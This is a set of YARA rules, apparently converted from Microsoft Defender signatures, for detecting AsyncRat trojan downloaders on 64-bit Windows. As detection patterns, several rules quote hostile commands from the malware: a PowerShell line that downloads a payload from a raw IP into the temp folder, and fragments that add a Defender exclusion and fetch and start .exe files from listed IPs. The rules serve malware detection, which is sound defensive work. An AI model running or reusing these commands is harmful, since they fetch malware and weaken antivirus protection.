rule TrojanDownloader_Win64_AsyncRat_CEB_2147845754_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/AsyncRat.CEB!MTB"
        threat_id = "2147845754"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "AsyncRat"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {f3 0f 7f 4c 24 ?? 66 c7 44 24 [0-4] 66 0f 6f 0d ?? 20 00 00 f3 0f 7f 44 24 ?? c6 44 24 ?? ?? f3 0f 7f 4c 24 [0-3] c7 44 24 [0-10] 48 c7 44 24 20 00 00 00 00 ff}  //weight: 5, accuracy: Low
        $x_1_2 = "\\x64\\Release\\WechatAnd.pdb" ascii //weight: 1
        $x_1_3 = "\\code.bin" wide //weight: 1
        $x_1_4 = "WindowsProject1" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win64_AsyncRat_CCIQ_2147926487_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/AsyncRat.CCIQ!MTB"
        threat_id = "2147926487"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "AsyncRat"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {48 81 c7 5d 7a 17 48 57 5f 49 31 38 eb 0b 56 5e}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win64_AsyncRat_CCJU_2147932185_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/AsyncRat.CCJU!MTB"
        threat_id = "2147932185"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "AsyncRat"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "powershell(new-object System.Net.WebClient).DownloadFile('http://149.88.66.68/test.mp3','%Temp%/test.bin')" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win64_AsyncRat_CCJX_2147940233_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win64/AsyncRat.CCJX!MTB"
        threat_id = "2147940233"
        type = "TrojanDownloader"
        platform = "Win64: Windows 64-bit platform"
        family = "AsyncRat"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "powershell.exe" wide //weight: 2
        $x_2_2 = "-Command \"Add-MpPreference -ExclusionPath" wide //weight: 2
        $x_2_3 = "Start-Process" wide //weight: 2
        $x_2_4 = "-OutFile" wide //weight: 2
        $x_2_5 = "-Command \"Invoke-WebRequest -Uri" wide //weight: 2
        $x_1_6 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 31 00 38 00 35 00 2e 00 33 00 39 00 2e 00 31 00 37 00 2e 00 37 00 30 00 2f 00 [0-15] 2f 00 [0-15] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_7 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 37 00 37 00 2e 00 32 00 32 00 33 00 2e 00 31 00 31 00 39 00 2e 00 38 00 35 00 2f 00 [0-15] 2f 00 [0-15] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_8 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 38 00 30 00 2e 00 36 00 34 00 2e 00 31 00 38 00 2e 00 31 00 37 00 33 00 2f 00 [0-15] 2f 00 [0-15] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_2_*) and 3 of ($x_1_*))) or
            ((5 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

